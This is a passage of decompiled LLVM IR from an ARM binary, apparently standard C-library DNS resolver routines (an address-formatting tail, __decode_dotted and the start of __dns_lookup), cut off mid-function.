  %v1_1b0b4 = add i32 %v0_1b0b4, 12
  store i32 %v1_1b0b4, i32* %r0.global-to-local, align 4
  %v3_1b0bc = call i32 @inet_ntop4(i32 %v1_1b0b4, i32 %v5_1b078, i32 %v1_1b0b0)
  store i32 %v3_1b0bc, i32* %r0.global-to-local, align 4
  %v2_1b0c0 = icmp eq i32 %v3_1b0bc, 0
  store i1 %v2_1b0c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1b0c0, label %bb57, label %dec_label_pc_1b0cc

bb57:                                             ; preds = %dec_label_pc_1b0a8
  %v1_1b0c4 = load i32, i32* @r6, align 4
  store i32 %v1_1b0c4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b16c

dec_label_pc_1b0cc:                               ; preds = %dec_label_pc_1b0a8
  %v0_1b0cc = load i32, i32* @r4, align 4
  %v1_1b0cc = inttoptr i32 %v0_1b0cc to i8*
  store i32 %v0_1b0cc, i32* %r0.global-to-local, align 4
  %v3_1b0d0 = call i32 @strlen(i8* %v1_1b0cc)
  store i32 %v3_1b0d0, i32* %r0.global-to-local, align 4
  %v0_1b0d4 = load i32, i32* @r4, align 4
  %v2_1b0d4 = add i32 %v0_1b0d4, %v3_1b0d0
  store i32 %v2_1b0d4, i32* @r4, align 4
  %v0_1b10c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1b10c

dec_label_pc_1b0dc:                               ; preds = %dec_label_pc_1b098, %dec_label_pc_1b090, %dec_label_pc_1b080, %dec_label_pc_1b074, %dec_label_pc_1b06c
  %v0_1b0e4 = phi i32 [ %v5_1b078, %dec_label_pc_1b098 ], [ %v5_1b078, %dec_label_pc_1b090 ], [ %v5_1b078, %dec_label_pc_1b080 ], [ %v5_1b078, %dec_label_pc_1b074 ], [ %v2_1b07869, %dec_label_pc_1b06c ]
  store i32 %v2_1af78, i32* @lr, align 4
  %v1_1b0e0 = load i32, i32* @r5, align 4
  %v4_1b0e0 = mul i32 %v1_1b0e0, 4
  %v5_1b0e0 = add i32 %v4_1b0e0, %v2_1af78
  store i32 %v0_1b0e4, i32* @r0, align 4
  %v1_1b0e8 = add i32 %v5_1b0e0, -32
  %v2_1b0e8 = inttoptr i32 %v1_1b0e8 to i32*
  %v3_1b0e8 = load i32, i32* %v2_1b0e8, align 4
  store i32 %v3_1b0e8, i32* %r2.global-to-local, align 4
  %v0_1b0ec = load i32, i32* @fp, align 4
  %v7_1b0f0 = call i32 @sprintf(i32 %v0_1b0e4, i32 %v0_1b0ec, i32 %v3_1b0e8, i32 %v5_1b0e0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_1b0f0, i32* %r0.global-to-local, align 4
  %v0_1b0f4 = load i32, i32* @r4, align 4
  %v2_1b0f4 = add i32 %v0_1b0f4, %v7_1b0f0
  store i32 %v2_1b0f4, i32* @r4, align 4
  br label %dec_label_pc_1b0f8

dec_label_pc_1b0f8:                               ; preds = %bb56, %dec_label_pc_1b060, %dec_label_pc_1b0dc
  %v3_1b06429 = phi i32 [ %v6_1b064, %bb56 ], [ %v2_1b07869, %dec_label_pc_1b060 ], [ %v2_1b0f4, %dec_label_pc_1b0dc ]
  %v0_1b0f8 = load i32, i32* @r5, align 4
  %v1_1b0f8 = add i32 %v0_1b0f8, 1
  store i32 %v1_1b0f8, i32* @r5, align 4
  %v0_1b048.pre = load i32, i32* @r6, align 4
  %v7_1b100 = icmp slt i32 %v1_1b0f8, 8
  %v7_1b048 = icmp eq i32 %v0_1b048.pre, -1
  store i1 %v7_1b048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b100, label %dec_label_pc_1b048, label %dec_label_pc_1b104

dec_label_pc_1b104:                               ; preds = %dec_label_pc_1b0f8
  br i1 %v7_1b048, label %.thread2, label %dec_label_pc_1b10c

dec_label_pc_1b10c:                               ; preds = %dec_label_pc_1b104, %dec_label_pc_1b0cc
  %v3_1b118 = phi i32 [ %v3_1b06429, %dec_label_pc_1b104 ], [ %v2_1b0d4, %dec_label_pc_1b0cc ]
  %v0_1b10c = phi i32 [ %v0_1b048.pre, %dec_label_pc_1b104 ], [ %v0_1b10c.pre, %dec_label_pc_1b0cc ]
  %v1_1b10c = load i32, i32* @r7, align 4
  %v2_1b10c = add i32 %v1_1b10c, %v0_1b10c
  %v7_1b110 = icmp eq i32 %v2_1b10c, 8
  store i1 %v7_1b110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1b110, label %bb58, label %.thread2

bb58:                                             ; preds = %dec_label_pc_1b10c
  %v4_1b118 = inttoptr i32 %v3_1b118 to i8*
  store i8 58, i8* %v4_1b118, align 1
  %v5_1b118 = load i32, i32* @r4, align 4
  %v6_1b118 = add i32 %v5_1b118, 1
  store i32 %v6_1b118, i32* @r4, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1b10c, %dec_label_pc_1b104, %bb58
  %v2_1b120 = phi i32 [ %v3_1b118, %dec_label_pc_1b10c ], [ %v3_1b06429, %dec_label_pc_1b104 ], [ %v6_1b118, %bb58 ]
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1b120 = inttoptr i32 %v2_1b120 to i8*
  store i8 0, i8* %v3_1b120, align 1
  %v4_1b120 = load i32, i32* @r4, align 4
  %v5_1b120 = add i32 %v4_1b120, 1
  store i32 %v2_1b030, i32* @r1, align 4
  %v2_1b128 = load i32, i32* %stack_var_-128, align 4
  store i32 %v2_1b128, i32* %r2.global-to-local, align 4
  %v2_1b12c = sub i32 %v5_1b120, %v2_1b030
  %v9_1b130 = icmp eq i32 %v2_1b12c, %v2_1b128
  store i1 %v9_1b130, i1* %cpsr_z.global-to-local, align 1
  %tmp75 = icmp ugt i32 %v2_1b12c, %v2_1b128
  br i1 %tmp75, label %dec_label_pc_1b138, label %dec_label_pc_1b14c

dec_label_pc_1b138:                               ; preds = %.thread2
  %v0_1b138 = call i32 @__GI___errno_location()
  store i32 %v0_1b138, i32* %r0.global-to-local, align 4
  %v0_1b140 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1b140, i32* %r2.global-to-local, align 4
  %v2_1b144 = inttoptr i32 %v0_1b138 to i32*
  store i32 28, i32* %v2_1b144, align 4
  %v0_1b16c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b16c

dec_label_pc_1b14c:                               ; preds = %.thread2
  store i32 %arg3, i32* %r0.global-to-local, align 4
  %v2_1b150 = inttoptr i32 %arg3 to i8*
  %v3_1b150 = call i32 @strcpy(i8* %v2_1b150, i32 %v2_1b030)
  br label %dec_label_pc_1b154

dec_label_pc_1b154:                               ; preds = %dec_label_pc_1af34, %dec_label_pc_1b14c
  %storemerge = phi i32 [ %v3_1af40, %dec_label_pc_1af34 ], [ %v3_1b150, %dec_label_pc_1b14c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b16c

dec_label_pc_1b15c:                               ; preds = %dec_label_pc_1af28
  %v0_1b15c = call i32 @__GI___errno_location()
  store i32 %v0_1b15c, i32* %r0.global-to-local, align 4
  %v2_1b164 = inttoptr i32 %v0_1b15c to i32*
  store i32 97, i32* %v2_1b164, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1b16c

dec_label_pc_1b16c:                               ; preds = %bb57, %dec_label_pc_1b154, %dec_label_pc_1b138, %dec_label_pc_1b15c
  %v0_1b16c = phi i32 [ %v1_1b0c4, %bb57 ], [ %storemerge, %dec_label_pc_1b154 ], [ %v0_1b16c.pre, %dec_label_pc_1b138 ], [ 0, %dec_label_pc_1b15c ]
  store i32 %v0_1b16c, i32* %r0.global-to-local, align 4
  store i32 %v6_1af04, i32* %r5.global-to-local, align 4
  ret i32 %v0_1b16c

; uselistorder directives
  uselistorder i32 %v0_1b16c, { 1, 0 }
  uselistorder i1 %v7_1b048, { 2, 0, 1 }
  uselistorder i32 %v0_1b048.pre, { 1, 0, 2 }
  uselistorder i32 %v1_1b0f8, { 0, 2, 1 }
  uselistorder i32 %v0_1b0e4, { 1, 0 }
  uselistorder i32 %v0_1b0cc, { 1, 0 }
  uselistorder i32 %v5_1b078, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i1 %v9_1b050, { 1, 0, 2 }
  uselistorder i32 %v2_1b07869, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1b07471, { 5, 4, 2, 3, 0, 1 }
  uselistorder i1 %v7_1b04868, { 1, 0 }
  uselistorder i32 %v2_1b030, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_1b040, { 1, 0, 2 }
  uselistorder i1 %v7_1b01c, { 1, 0 }
  uselistorder i32 %v0_1b01c, { 1, 2, 0 }
  uselistorder i32 %v1_1b040.pre, { 2, 0, 1 }
  uselistorder i32 %v0_1b014.pre, { 0, 1, 3, 2 }
  uselistorder i1 %v7_1b004, { 1, 0 }
  uselistorder i1 %v7_1affc, { 1, 0 }
  uselistorder i32 %v1_1aff0, { 1, 0 }
  uselistorder i32 %v0_1b004, { 1, 2, 0, 3 }
  uselistorder i32 %v0_1b018, { 1, 2, 0, 3 }
  uselistorder i1 %v7_1afb8, { 1, 0 }
  uselistorder i32 %v0_1aff0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_1afd4, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_1afe4, { 3, 1, 0, 2 }
  uselistorder i32 %v1_1af74, { 1, 0, 2 }
  uselistorder i32 %v2_1af5c, { 1, 0 }
  uselistorder i32 %v0_1af74, { 3, 1, 0, 2 }
  uselistorder i32 %v2_1af78, { 0, 4, 3, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 1, 4, 5, 6, 8, 7, 13, 9, 10, 11, 12, 15, 14, 16, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 23, 14, 15, 16, 17, 18, 22, 19, 20, 21 }
  uselistorder i32 97, { 5, 6, 9, 1, 0, 8, 10, 2, 3, 4, 7 }
  uselistorder i8 58, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sprintf, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @inet_ntop4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1b16c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_1b154, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b0f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1b048, { 1, 0 }
  uselistorder label %dec_label_pc_1b01c._crit_edge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b01c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1b014, { 1, 0 }
  uselistorder label %dec_label_pc_1aff0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1afec, { 1, 0 }
  uselistorder label %dec_label_pc_1afa4, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1b188 = load i32, i32* @r5, align 4
  %v0_1b18c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1b18c, i32* %sl.global-to-local, align 4
  %v2_1b18c = icmp eq i32 %v0_1b18c, 0
  br i1 %v2_1b18c, label %.thread30, label %dec_label_pc_1b1b4.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1b274

dec_label_pc_1b1b4.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1b1b44 = load i32, i32* @r1, align 4
  %v6_1b1b814 = icmp slt i32 %v0_1b1b44, %arg2
  br i1 %v6_1b1b814, label %dec_label_pc_1b1bc.preheader, label %dec_label_pc_1b274

dec_label_pc_1b1bc.preheader:                     ; preds = %dec_label_pc_1b1b4.preheader
  %v2_1b1bc51 = add i32 %v0_1b18c, %v0_1b1b44
  %v3_1b1bc52 = inttoptr i32 %v2_1b1bc51 to i8*
  %v4_1b1bc53 = load i8, i8* %v3_1b1bc52, align 1
  %v6_1b1bc54 = zext i8 %v4_1b1bc53 to i32
  store i32 %v6_1b1bc54, i32* @r4, align 4
  %v2_1b1c055 = icmp eq i8 %v4_1b1bc53, 0
  br i1 %v2_1b1c055, label %bb49, label %dec_label_pc_1b1c8

dec_label_pc_1b1b0:                               ; preds = %bb48, %bb44
  %v1_1b1b4 = phi i32 [ %v1_1b1b4.pre, %bb48 ], [ %v1_1b1e059, %bb44 ]
  %v0_1b1b4 = phi i32 [ %v0_1b1b4.pre, %bb48 ], [ %v5_1b1f8, %bb44 ]
  %v0_1b1b0 = phi i32 [ %v0_1b1b0.pre, %bb48 ], [ %v0_1b1fc60, %bb44 ]
  store i32 %v0_1b1b0, i32* %r0.global-to-local, align 4
  %v6_1b1b8 = icmp slt i32 %v0_1b1b4, %v1_1b1b4
  br i1 %v6_1b1b8, label %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge, label %dec_label_pc_1b274

dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge:  ; preds = %dec_label_pc_1b1b0
  %v0_1b1bc.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1b1bc = add i32 %v0_1b1bc.pre, %v0_1b1b4
  %v3_1b1bc = inttoptr i32 %v2_1b1bc to i8*
  %v4_1b1bc = load i8, i8* %v3_1b1bc, align 1
  %v6_1b1bc = zext i8 %v4_1b1bc to i32
  store i32 %v6_1b1bc, i32* @r4, align 4
  %v2_1b1c0 = icmp eq i8 %v4_1b1bc, 0
  %v0_1b260 = load i32, i32* @ip, align 4
  %v2_1b260 = icmp eq i32 %v0_1b260, 0
  br i1 %v2_1b1c0, label %dec_label_pc_1b260, label %dec_label_pc_1b1c8

dec_label_pc_1b1c8:                               ; preds = %dec_label_pc_1b1bc.preheader, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge
  %v2_1b26066 = phi i1 [ %v2_1b260, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ false, %dec_label_pc_1b1bc.preheader ]
  %v0_1b26064 = phi i32 [ %v0_1b260, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ 1, %dec_label_pc_1b1bc.preheader ]
  %v6_1b1bc63 = phi i32 [ %v6_1b1bc, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ %v6_1b1bc54, %dec_label_pc_1b1bc.preheader ]
  %v0_1b1e862 = phi i32 [ %v0_1b1bc.pre, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ %v0_1b18c, %dec_label_pc_1b1bc.preheader ]
  %v0_1b1d861 = phi i32 [ %v0_1b1b4, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ %v0_1b1b44, %dec_label_pc_1b1bc.preheader ]
  %v0_1b1fc60 = phi i32 [ %v0_1b1b0, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ 0, %dec_label_pc_1b1bc.preheader ]
  %v1_1b1e059 = phi i32 [ %v1_1b1b4, %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge ], [ %arg2, %dec_label_pc_1b1bc.preheader ]
  %v1_1b1cc = and i32 %v6_1b1bc63, 192
  br i1 %v2_1b26066, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1b1c8
  %v1_1b1d0 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b1d0 = add i32 %v1_1b1d0, 1
  store i32 %v2_1b1d0, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1b1c8, %bb
  %v2_1b1d4 = icmp eq i32 %v1_1b1cc, 192
  %v1_1b1d8 = add i32 %v0_1b1d861, 1
  store i32 %v1_1b1d8, i32* %r1.global-to-local, align 4
  br i1 %v2_1b1d4, label %dec_label_pc_1b1e0, label %dec_label_pc_1b208

dec_label_pc_1b1e0:                               ; preds = %bb42
  %v6_1b1e4 = icmp slt i32 %v1_1b1d8, %v1_1b1e059
  br i1 %v6_1b1e4, label %dec_label_pc_1b1e8, label %dec_label_pc_1b274

dec_label_pc_1b1e8:                               ; preds = %dec_label_pc_1b1e0
  %v2_1b1e8 = add i32 %v1_1b1d8, %v0_1b1e862
  %v3_1b1e8 = inttoptr i32 %v2_1b1e8 to i8*
  %v4_1b1e8 = load i8, i8* %v3_1b1e8, align 1
  %v6_1b1e8 = zext i8 %v4_1b1e8 to i32
  %v1_1b1f0 = urem i32 %v6_1b1bc63, 64
  br i1 %v2_1b26066, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1b1e8
  %v1_1b1f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b1f4 = add i32 %v1_1b1f4, 1
  store i32 %v2_1b1f4, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1b1e8, %bb43
  %v4_1b1f8 = mul nuw nsw i32 %v1_1b1f0, 256
  %v5_1b1f8 = or i32 %v6_1b1e8, %v4_1b1f8
  store i32 %v5_1b1f8, i32* %r1.global-to-local, align 4
  store i32 %v0_1b1fc60, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1b1b0

dec_label_pc_1b208:                               ; preds = %bb42
  %v2_1b208 = add i32 %v6_1b1bc63, %v0_1b1fc60
  store i32 %v2_1b208, i32* %r6.global-to-local, align 4
  %v3_1b20c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1b20c, i32* @r3, align 4
  %v1_1b210 = add i32 %v2_1b208, 1
  store i32 %v1_1b210, i32* %r7.global-to-local, align 4
  %v3_1b214 = icmp ult i32 %v1_1b210, %v3_1b20c
  br i1 %v3_1b214, label %dec_label_pc_1b21c, label %dec_label_pc_1b274

dec_label_pc_1b21c:                               ; preds = %dec_label_pc_1b208
  %v2_1b21c = add i32 %v6_1b1bc63, %v1_1b1d8
  store i32 %v2_1b21c, i32* @r5, align 4
  %v3_1b220 = icmp ult i32 %v2_1b21c, %v1_1b1e059
  br i1 %v3_1b220, label %dec_label_pc_1b228, label %dec_label_pc_1b274

dec_label_pc_1b228:                               ; preds = %dec_label_pc_1b21c
  %v2_1b228 = add i32 %v1_1b1d8, %v0_1b1e862
  store i32 %v2_1b228, i32* @r1, align 4
  %v0_1b22c = load i32, i32* %sb.global-to-local, align 4
  %v2_1b22c = add i32 %v0_1b22c, %v0_1b1fc60
  store i32 %v2_1b22c, i32* @r0, align 4
  store i32 %v6_1b1bc63, i32* @r2, align 4
  %v0_1b238 = call i32 @memcpy()
  store i32 %v0_1b238, i32* %r0.global-to-local, align 4
  store i32 %v0_1b26064, i32* @ip, align 4
  %v0_1b240 = load i32, i32* %sl.global-to-local, align 4
  %v1_1b240 = load i32, i32* @r5, align 4
  %v2_1b240 = add i32 %v1_1b240, %v0_1b240
  %v3_1b240 = inttoptr i32 %v2_1b240 to i8*
  %v4_1b240 = load i8, i8* %v3_1b240, align 1
  br i1 %v2_1b26066, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1b228
  %v1_1b248 = load i32, i32* %r8.global-to-local, align 4
  %v2_1b248 = load i32, i32* @r4, align 4
  %v3_1b248 = add i32 %v2_1b248, %v1_1b248
  store i32 %v3_1b248, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1b228, %bb45
  %v2_1b24c = icmp eq i8 %v4_1b240, 0
  br i1 %v2_1b24c, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1b258.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1b240, i32* %r1.global-to-local, align 4
  %v2_1b258 = load i32, i32* %sb.global-to-local, align 4
  %v3_1b258 = load i32, i32* %r6.global-to-local, align 4
  %v4_1b258 = add i32 %v3_1b258, %v2_1b258
  %v5_1b258 = inttoptr i32 %v4_1b258 to i8*
  store i8 %v0_1b258.off0, i8* %v5_1b258, align 1
  %v0_1b1b0.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1b1b4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1b1b4.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1b1b0

dec_label_pc_1b260:                               ; preds = %dec_label_pc_1b1b0.dec_label_pc_1b1bc_crit_edge
  %v0_1b268.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1b260, label %dec_label_pc_1b274, label %bb49

bb49:                                             ; preds = %dec_label_pc_1b1bc.preheader, %dec_label_pc_1b260
  %v0_1b268.pre69 = phi i32 [ %v0_1b268.pre.pre, %dec_label_pc_1b260 ], [ 0, %dec_label_pc_1b1bc.preheader ]
  %v2_1b264 = add i32 %v0_1b268.pre69, 1
  store i32 %v2_1b264, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1b274

dec_label_pc_1b274:                               ; preds = %dec_label_pc_1b21c, %dec_label_pc_1b208, %dec_label_pc_1b1e0, %dec_label_pc_1b1b0, %dec_label_pc_1b260, %dec_label_pc_1b1b4.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1b264, %bb49 ], [ -1, %dec_label_pc_1b1b4.preheader ], [ %v0_1b268.pre.pre, %dec_label_pc_1b260 ], [ -1, %dec_label_pc_1b208 ], [ -1, %dec_label_pc_1b21c ], [ -1, %dec_label_pc_1b1b0 ], [ -1, %dec_label_pc_1b1e0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1b188, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1b268.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1b240, { 1, 0 }
  uselistorder i32 %v5_1b1f8, { 1, 0 }
  uselistorder i32 %v1_1b1d8, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1b1fc60, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1b1bc63, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1b26066, { 1, 2, 0 }
  uselistorder i32 %v0_1b18c, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1b274, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1b1c8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1b280 = load i32, i32* @r4, align 4
  %v6_1b280 = load i32, i32* @r5, align 4
  %v9_1b280 = load i32, i32* @r6, align 4
  %v12_1b280 = load i32, i32* @r7, align 4
  %v15_1b280 = load i32, i32* @r8, align 4
  %v18_1b280 = load i32, i32* @sb, align 4
  %v21_1b280 = load i32, i32* @sl, align 4
  %v24_1b280 = load i32, i32* @fp, align 4
  %v27_1b280 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1b294 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b29c = call i32 @malloc(i32 512)
  store i32 %v1_1b29c, i32* @sl, align 4
  %v0_1b2a4 = load i32, i32* @r4, align 4
  %v1_1b2a4 = inttoptr i32 %v0_1b2a4 to i8*
  %v3_1b2a8 = call i32 @strlen(i8* %v1_1b2a4)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1b2b4 = icmp ugt i32 %v3_1b2a8, 893
  store i1 %v3_1b2b4, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_1b2a8, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1b2d4

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b9e4

dec_label_pc_1b2d4:                               ; preds = %entry
  %v1_1b2d8 = add i32 %v3_1b2a8, 130
  %v1_1b2dc = call i32 @malloc(i32 %v1_1b2d8)
  store i32 %v1_1b2dc, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b2e0 = icmp eq i32 %v1_1b2dc, 0
  br i1 %v2_1b2e0, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1b2d4
  %v1_1b2e4 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1b2e4 = icmp eq i32 %v1_1b2e4, 0
  br i1 %v3_1b2e4, label %bb213, label %dec_label_pc_1b2f8

.thread5:                                         ; preds = %dec_label_pc_1b2d4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b9dc

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1b9dc

dec_label_pc_1b2f8:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1b2f8 = load i32, i32* @r4, align 4
  %v1_1b2f8 = inttoptr i32 %v0_1b2f8 to i8*
  %v2_1b2f8 = load i8, i8* %v1_1b2f8, align 1
  %v3_1b2f8 = zext i8 %v2_1b2f8 to i32
  store i32 %v3_1b2f8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1b2fc = icmp eq i8 %v2_1b2f8, 0
  br i1 %v2_1b2fc, label %dec_label_pc_1b9dc, label %dec_label_pc_1b304

dec_label_pc_1b304:                               ; preds = %dec_label_pc_1b2f8
  %v2_1b308 = add i32 %v0_1b2f8, %v3_1b2a8
  store i32 %v2_1b308, i32* %r3.global-to-local, align 4
  %v1_1b30c = add i32 %v2_1b308, -1
  %v2_1b30c = inttoptr i32 %v1_1b30c to i8*
  %v3_1b30c = load i8, i8* %v2_1b30c, align 1
  %v4_1b30c = zext i8 %v3_1b30c to i32
  store i32 %v4_1b30c, i32* @r3, align 4
  store i32 %v3_1b2a8, i32* @r2, align 4
  store i32 %v0_1b2f8, i32* @r1, align 4
  %v0_1b31c = call i32 @memcpy()
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 27560, i32* %ip.global-to-local, align 4
  store i32 26524, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1b398 = ptrtoint i32* %stack_var_-76 to i32
  %v2_1b4b0 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1b4b4 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1b4d8 = ptrtoint i32* %stack_var_-192 to i32
  %v2_1b4f8 = bitcast i32* %stack_var_-192 to i8*
  %v2_1b5ac = ptrtoint i32* %stack_var_-48 to i32
  %v2_1b5b8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1b644 = icmp eq i32 %tmp161, 0
  %v1_1b650 = add i32 %tmp160, -2
  %v2_1b654 = icmp ne i32 %v1_1b650, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_1b740 = ptrtoint i32* %stack_var_-448 to i32
